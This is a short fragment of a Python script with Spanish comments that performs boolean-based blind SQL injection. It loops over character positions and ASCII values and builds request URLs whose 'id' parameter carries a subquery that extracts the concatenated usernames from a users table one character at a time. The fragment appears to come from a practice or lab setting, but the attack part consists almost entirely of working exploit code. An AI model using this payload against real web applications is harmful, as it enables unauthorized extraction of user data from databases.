...
"""
Se añade un sub query que nos permita modificar el parámetro username, para que podamos ver todos los usuarios correpondientes por cómo funciona la función group_concat
"""
...
def makesqli():
    ...
    for position in range(1,50):
        for character in range(33,127): # 33 del código ascii hasta el valor 126 del código ascii
            sqli_url = main_url + "?id=15 or (select (select ascii(substring((select group_concat(username) from users),%d,1)) from users where id=1) = %d)" % (position, character)
